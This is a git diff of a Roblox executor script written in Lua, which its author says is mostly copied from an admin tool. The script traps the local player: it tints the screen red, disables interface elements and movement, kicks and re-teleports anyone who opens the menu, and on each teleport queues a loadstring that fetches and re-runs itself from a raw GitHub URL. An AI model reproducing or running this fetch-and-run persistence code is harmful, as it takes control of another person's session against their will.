@@ -1,5 +1,10 @@
+--[[
+most of this is skidded from iy
+comments will be shown where ios skidded
+]]
+
 noFunction = function(...) warn(`noFunction { tostring(...) }`) end
-qtp = (syn and syn.queue_on_teleport) or queue_on_teleport or (fluxus and fluxus.queue_on_teleport) or queueteleport or noFunction
+qtp = (syn and syn.queue_on_teleport) or queue_on_teleport or (fluxus and fluxus.queue_on_teleport) or queueteleport or noFunction -- skidded
 
 Lighting = game:GetService("Lighting")
 ReplicatedStorage = game:GetService("ReplicatedStorage")
@@ -10,7 +15,7 @@ GuiService = game:GetService("GuiService")
 TeleportService = game:GetService("TeleportService")
 CoreGui = game:GetService("CoreGui")
 
-Players.LocalPlayer.OnTeleport:Connect(function(State)
+Players.LocalPlayer.OnTeleport:Connect(function(State) -- skidded
     if qtp and qtp ~= noFunction then
         qtp("loadstring(game:HttpGet('https://raw.githubusercontent.com/buhhhhg/RobloxScriptz/refs/heads/main/scary.lua'))()")
     end
@@ -19,18 +24,16 @@ end)
 PlaceId, JobId = game.PlaceId, game.JobId
 
 GuiService.MenuOpened:Connect(function()
-	if #Players:GetPlayers() <= 1 then
+	if qtp and qtp ~= noFunction then
+            qtp("loadstring(game:HttpGet('https://raw.githubusercontent.com/buhhhhg/RobloxScriptz/refs/heads/main/scary.lua'))()")
+	end
+
+	if #Players:GetPlayers() <= 1 then -- skidded
 		Players.LocalPlayer:Kick("\nNice try. You cant escape")
-		wait()
-        if qtp and qtp ~= noFunction then
-            qtp("loadstring(game:HttpGet('https://raw.githubusercontent.com/buhhhhg/RobloxScriptz/refs/heads/main/scary.lua'))()")
-		end
-        TeleportService:Teleport(PlaceId, Players.LocalPlayer)
+		task.wait()
+        	TeleportService:Teleport(PlaceId, Players.LocalPlayer)
 	else
-        if qtp and qtp ~= noFunction then
-            qtp("loadstring(game:HttpGet('https://raw.githubusercontent.com/buhhhhg/RobloxScriptz/refs/heads/main/scary.lua'))()")
-		end
-        TeleportService:TeleportToPlaceInstance(PlaceId, JobId, Players.LocalPlayer)
+        	TeleportService:TeleportToPlaceInstance(PlaceId, JobId, Players.LocalPlayer)
 	end
 end)
 
@@ -39,19 +42,19 @@ isLegacyChat = TextChatService.ChatVersion == Enum.ChatVersion.LegacyChatService
 
 Red = Instance.new("ColorCorrectionEffect", Lighting)
 
-coreGuiTypeNames = {
+coreGuiTypeNames = { -- skidded
     Enum.CoreGuiType.Backpack,
     Enum.CoreGuiType.PlayerList,
     Enum.CoreGuiType.EmotesMenu
 }
 
-for _, enumItem in ipairs(Enum.CoreGuiType:GetEnumItems()) do
+for _, enumItem in ipairs(Enum.CoreGuiType:GetEnumItems()) do -- skidded
     if not string.find(enumItem.Name:lower(), "selfview") then
         table.insert(coreGuiTypeNames, enumItem)
     end
 end
 
-function chatMessage(str)
+function chatMessage(str) -- skidded
     str = tostring(str)
     if not isLegacyChat then
         TextChatService.TextChannels.RBXGeneral:SendAsync(str)
@@ -60,7 +63,7 @@ function chatMessage(str)
     end
 end
 
-function randstr(length)
+function randstr(length) -- skidded, but not from IY
     a = ''
     for i = 1, length do
         a = a .. utf8.char(math.random(50,2000))
@@ -78,7 +81,7 @@ Red.TintColor = Color3.fromRGB(255, 0, 0)
 task.spawn(function()
     while task.wait(0.005) do
         for _, guiType in pairs(coreGuiTypeNames) do
-            pcall(function() StarterGui:SetCoreGuiEnabled(guiType, false) end)
+            pcall(function() StarterGui:SetCoreGuiEnabled(guiType, false) end) -- skidded
         end
     end
 end)
@@ -130,7 +133,7 @@ task.spawn(function()
             if Humanoid.UseJumpPower then
                 Humanoid.JumpPower = 0
             else
-                Humanoid.JumpHeight = 0
+                Humanoid.JumpHeight = 0 -- skidded
             end
         end
     end
@@ -173,7 +176,7 @@ task.spawn(function()
         if Character then
             table.foreach(Character:GetChildren(), function(_, x)
                 if x:IsA("BasePart") then
-                    x.Velocity, x.RotVelocity = Vector3.new(), Vector3.new()
+                    x.Velocity, x.RotVelocity = Vector3.new(), Vector3.new() -- skidded from nameless admin, in which also is skidded
                 end
             end)
         end
@@ -195,7 +198,7 @@ end)
 
 PlayerGui = Players.LocalPlayer.PlayerGui
 oo = {true, false}
-hui = get_hidden_gui or gethui or function(...) return CoreGui.HiddenUI or nil end
+hui = get_hidden_gui or gethui or function(...) return CoreGui.HiddenUI or nil end -- skidded
 huiP = hui()
 
 properties = {
